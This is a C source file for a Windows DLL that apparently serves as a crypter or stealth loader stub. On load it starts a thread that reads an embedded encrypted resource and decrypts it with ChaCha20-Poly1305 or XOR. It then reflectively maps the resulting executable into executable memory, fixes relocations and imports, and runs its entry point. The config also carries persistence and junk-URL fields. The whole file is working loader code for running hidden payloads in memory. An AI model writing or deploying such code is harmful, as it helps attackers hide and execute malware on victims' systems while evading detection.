#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdarg.h>
#include "crypto.h"
#ifdef USE_OPENSSL
// OpenSSL for AES-GCM (optional; define USE_OPENSSL at compile time)
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#endif

// Lightweight logger shared with the stub log for diagnostics in in-memory mode
static void tpl_log(const char *fmt, ...) {
    char tmp[MAX_PATH];
    if (!GetTempPathA(sizeof(tmp), tmp)) return;
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%sstealth_debug.log", tmp);
    HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    _vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    DWORD written = 0;
    WriteFile(hf, buf, (DWORD)strlen(buf), &written, NULL);
    WriteFile(hf, "\n", 1, &written, NULL);
    CloseHandle(hf);
}

static void secure_zero(void *ptr, size_t len) {
    if (ptr && len) {
        SecureZeroMemory(ptr, len);
    }
}

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

int apply_relocations(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader, DWORD64 delta, SIZE_T image_size) {
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) return 0;
    ULONG reloc_rva = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (reloc_rva == 0 || reloc_rva >= image_size) return -1;
    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(imageBase + reloc_rva);
    SIZE_T processed = 0;
    SIZE_T dir_size = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while (processed < dir_size && relocation->VirtualAddress) {
        if (relocation->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) return -1;
        DWORD numRelocs = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *relocData = (WORD *)(relocation + 1);
        for (DWORD i = 0; i < numRelocs; i++) {
            int type = relocData[i] >> 12;
            int offset = relocData[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                SIZE_T addr_off = (SIZE_T)relocation->VirtualAddress + (SIZE_T)offset;
                if (addr_off + sizeof(DWORD64) > image_size) return -1;
                DWORD64 *address = (DWORD64 *)(imageBase + addr_off);
                *address += delta;
            }
        }
        processed += relocation->SizeOfBlock;
        relocation = (PIMAGE_BASE_RELOCATION)((BYTE *)relocation + relocation->SizeOfBlock);
    }
    return 0;
}

int resolve_imports(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader, SIZE_T image_size) {
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) return 0;
    ULONG import_rva = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (import_rva == 0 || import_rva >= image_size) return -1;
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + import_rva);
    SIZE_T processed = 0;
    SIZE_T dir_size = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    while (processed < dir_size && importDesc->Name) {
        ULONG name_rva = importDesc->Name;
        if (name_rva == 0 || name_rva >= image_size) return -1;
        LPCSTR dllName = (LPCSTR)(imageBase + name_rva);
        HMODULE hDll = LoadLibraryA(dllName);
        if (!hDll) return -1;
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);
        while (thunk->u1.AddressOfData) {
            if ((SIZE_T)thunk < (SIZE_T)imageBase || (SIZE_T)thunk >= (SIZE_T)imageBase + image_size) return -1;
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
            } else {
                ULONG import_by_name_rva = (ULONG)thunk->u1.AddressOfData;
                if (import_by_name_rva == 0 || import_by_name_rva >= image_size) return -1;
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + import_by_name_rva);
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, importByName->Name);
            }
            if (!thunk->u1.Function) return -1;
            thunk++;
        }
        processed += sizeof(IMAGE_IMPORT_DESCRIPTOR);
        importDesc++;
    }
    return 0;
}

HMODULE g_hModule = NULL;

DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
    tpl_log("[template] ExecutePayloadThread start");
    HRSRC hRes = FindResource(g_hModule, "CONFIG", "PAYLOAD");
    if (!hRes) {
        tpl_log("[template] FindResource CONFIG failed");
        return 1;
    }

    HGLOBAL hGlobal = LoadResource(g_hModule, hRes);
    if (!hGlobal) {
        tpl_log("[template] LoadResource failed");
        return 1;
    }

    void *config_data = LockResource(hGlobal);
    if (!config_data) {
        tpl_log("[template] LockResource failed");
        return 1;
    }

    DWORD config_size = SizeofResource(g_hModule, hRes);
    if (config_size == 0) {
        tpl_log("[template] SizeofResource returned 0");
        return 1;
    }

    // Parse header + PayloadConfig structure
    typedef struct {
        char magic[4];
        uint16_t version;
        uint16_t reserved;
    } PayloadHeader;
    typedef struct {
        char key_hex[65];           // 64 chars + null terminator
        unsigned char persistence;  // 1 byte
        uint32_t junk_url_count;    // 4 bytes
        uint64_t payload_size;      // 8 bytes
        unsigned char load_in_memory; // 1 byte
        unsigned char payload_data[1]; // Variable length
    } PayloadConfig;

    if (config_size < sizeof(PayloadHeader) + offsetof(PayloadConfig, payload_data)) {
        tpl_log("[template] config too small (%lu bytes)", (unsigned long)config_size);
        return 1;
    }
    PayloadHeader *hdr = (PayloadHeader *)config_data;
    if (memcmp(hdr->magic, "STCF", 4) != 0 || hdr->version != 1) {
        tpl_log("[template] header check failed: magic=%02X%02X%02X%02X version=%u", (unsigned char)hdr->magic[0], (unsigned char)hdr->magic[1], (unsigned char)hdr->magic[2], (unsigned char)hdr->magic[3], (unsigned)hdr->version);
        return 1;
    }
    PayloadConfig *config = (PayloadConfig *)((unsigned char *)config_data + sizeof(PayloadHeader));
    char *key_hex = config->key_hex;
    uint64_t payload_size = config->payload_size; // plaintext size
    unsigned char *encrypted_payload = config->payload_data;

    // Determine stored length (resource size minus header and struct prefix)
    size_t stored_len = (size_t)config_size - sizeof(PayloadHeader) - offsetof(PayloadConfig, payload_data);

    unsigned char *decrypted_payload = malloc((size_t)payload_size);
    if (!decrypted_payload) { tpl_log("[template] malloc decrypted_payload failed"); return 1; }
    unsigned char key[32];

    int decrypted_ok = 0;
    if (stored_len >= sizeof(CryptoEnvelope)) {
        CryptoEnvelope env;
        memcpy(&env, encrypted_payload, sizeof(env));
        if (env.version == CRYPTO_VERSION) {
            size_t ciphertext_len = stored_len - sizeof(CryptoEnvelope);
            if (ciphertext_len == env.ciphertext_len && ciphertext_len == (size_t)payload_size) {
                const uint8_t *ciphertext = encrypted_payload + sizeof(CryptoEnvelope);
                CryptoEnvelope env_use = env;
                env_use.ciphertext = ciphertext;
                env_use.ciphertext_len = ciphertext_len;
                uint8_t key[CRYPTO_KEY_LEN];
                if (crypto_argon2id_derive((const uint8_t *)key_hex, strlen(key_hex), env_use.salt, CRYPTO_SALT_LEN, env_use.t_cost, env_use.m_cost_kib, env_use.parallelism, key, sizeof(key)) == 0) {
                    if (crypto_chacha20_poly1305_decrypt(ciphertext, ciphertext_len, key, NULL, 0, &env_use, decrypted_payload) == 0) {
                        decrypted_ok = 1;
                    } else {
                        tpl_log("[template] chacha decrypt failed");
                    }
                } else {
                    tpl_log("[template] argon2id derive failed");
                }
                secure_zero(key, sizeof(key));
            } else {
                tpl_log("[template] ciphertext length mismatch");
            }
        }
    }

    if (!decrypted_ok) {
        // Fallback to legacy XOR for backward compatibility
        if ((size_t)payload_size > stored_len) { free(decrypted_payload); tpl_log("[template] XOR payload_size exceeds stored_len (%llu > %zu)", (unsigned long long)payload_size, stored_len); return 1; }
        if (strlen(key_hex) != 64) { free(decrypted_payload); tpl_log("[template] invalid key_hex length for XOR"); return 1; }
        hex_to_bytes(key_hex, key, 32);
        memcpy(decrypted_payload, encrypted_payload, (size_t)payload_size);
        for (uint64_t i = 0; i < payload_size; i++) decrypted_payload[i] ^= key[i % 32];
        secure_zero(key, sizeof(key));
        decrypted_ok = 1;
    }

    if (!decrypted_ok) { free(decrypted_payload); tpl_log("[template] decryption failed"); return 1; }

    tpl_log("[template] decrypted payload size=%llu", (unsigned long long)payload_size);

    // Allocate memory for the EXE image
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decrypted_payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { free(decrypted_payload); tpl_log("[template] invalid DOS signature"); return 1; }
    if (dosHeader->e_lfanew == 0 || (size_t)dosHeader->e_lfanew >= (size_t)payload_size) { free(decrypted_payload); tpl_log("[template] invalid e_lfanew"); return 1; }
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE *)decrypted_payload + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) { free(decrypted_payload); tpl_log("[template] invalid NT signature"); return 1; }
    SIZE_T image_size = ntHeader->OptionalHeader.SizeOfImage;
    if (image_size == 0 || image_size > (SIZE_T)payload_size * 10) { /* sanity cap */ free(decrypted_payload); tpl_log("[template] image_size sanity check failed (%zu)", image_size); return 1; }

    LPVOID imageBase = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        free(decrypted_payload);
        tpl_log("[template] VirtualAlloc imageBase failed");
        return 1;
    }

    // Copy headers (validate)
    SIZE_T headers_size = ntHeader->OptionalHeader.SizeOfHeaders;
    if (headers_size == 0 || headers_size > payload_size) { VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); tpl_log("[template] headers_size invalid (%zu)", headers_size); return 1; }
    memcpy(imageBase, decrypted_payload, headers_size);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
    for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        SIZE_T raw_size = section[i].SizeOfRawData;
        SIZE_T raw_ptr = section[i].PointerToRawData;
        SIZE_T virt_addr = section[i].VirtualAddress;
        if (raw_size == 0) continue;
        if (raw_ptr + raw_size > (SIZE_T)payload_size) { VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); tpl_log("[template] section raw overflow"); return 1; }
        if (virt_addr + raw_size > image_size) { VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); tpl_log("[template] section virt overflow"); return 1; }
        memcpy((BYTE *)imageBase + virt_addr, (BYTE *)decrypted_payload + raw_ptr, raw_size);
    }

    // Apply relocations
    DWORD64 delta = (DWORD64)imageBase - ntHeader->OptionalHeader.ImageBase;
    if (delta != 0) {
        if (apply_relocations((unsigned char *)imageBase, ntHeader, delta, image_size) != 0) {
            VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); tpl_log("[template] apply_relocations failed"); return 1;
        }
    }

    // Resolve imports
    if (resolve_imports((unsigned char *)imageBase, ntHeader, image_size) != 0) {
        VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); tpl_log("[template] resolve_imports failed"); return 1;
    }

    // Execute the payload
    typedef int (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);
    WinMain_t entryPoint = (WinMain_t)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
    // NOTE: When load_in_memory=1 the popup was previously missing because this loader
    // never actually called the GUI payload's WinMain with a visible show flag. We
    // explicitly invoke the entrypoint here with SW_SHOW to surface UI payloads (e.g.,
    // message_c.exe) and then signal the exit event so the stub can shut down.
    tpl_log("[template] calling entrypoint at RVA=0x%lx", (unsigned long)ntHeader->OptionalHeader.AddressOfEntryPoint);
    int result = entryPoint(NULL, NULL, NULL, SW_SHOW);
    tpl_log("[template] entrypoint returned %d", result);

    HANDLE hEvt = OpenEventA(EVENT_MODIFY_STATE, FALSE, "Global\\STEALTH_EXIT_EVENT");
    if (hEvt) {
        SetEvent(hEvt);
        CloseHandle(hEvt);
    }

    // Clean up
    VirtualFree(imageBase, 0, MEM_RELEASE);
    secure_zero(key, sizeof(key));
    free(decrypted_payload);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            tpl_log("[template] DllMain PROCESS_ATTACH");
            g_hModule = hModule; // Store the module handle for resource loading
            CreateThread(NULL, 0, ExecutePayloadThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}